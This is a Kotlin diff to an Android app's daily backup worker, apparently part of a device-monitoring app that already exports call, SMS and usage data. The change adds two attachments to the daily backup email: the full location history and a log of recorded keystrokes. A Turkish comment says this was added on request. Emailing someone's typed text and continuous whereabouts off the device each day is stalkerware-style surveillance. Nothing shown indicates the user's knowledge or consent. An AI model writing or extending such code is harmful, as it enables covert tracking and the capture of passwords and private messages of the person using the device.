@@ -62,7 +62,18 @@ class DailyBackupWorker(appContext: Context, params: WorkerParameters) : Corouti
         val blockedApps = try { db.blockedAppDao().all() } catch (t: Throwable) { emptyList() }
         val blockedAppsFile = try { ExportHelper.writeBlockedAppsTxt(applicationContext, blockedApps, cfg.examModeEnabled) } catch (t: Throwable) { null }
         val logFile = AppLogger.currentLogFile()?.takeIf { it.exists() }
-        val attachments = listOfNotNull(csvFile, scheduleFile, usageFile, callSmsFile, deviceReportFile, blockedAppsFile, logFile)
+        // "Sadece anlik degil, surekli degisen TUM konum" + klavye takibi kayitlari
+        // da eklensin istegi - ikisi de bos/kapaliysa fonksiyonlar null doner.
+        val locationFile = try {
+            ExportHelper.writeLocationHistoryCsv(applicationContext, db.locationLogDao().all())
+        } catch (t: Throwable) { null }
+        val keystrokeFile = try {
+            ExportHelper.writeKeystrokeLogCsv(applicationContext, db.keystrokeLogDao().observeRecent().first())
+        } catch (t: Throwable) { null }
+        val attachments = listOfNotNull(
+            csvFile, scheduleFile, usageFile, callSmsFile, deviceReportFile, blockedAppsFile, logFile,
+            locationFile, keystrokeFile,
+        )
 
         // 2) E-posta, sadece acik ve dolu ayarlanmissa.
         if (cfg.dailyBackupEnabled && cfg.backupEmail.isNotBlank() && cfg.backupEmailAppPassword.isNotBlank()) {
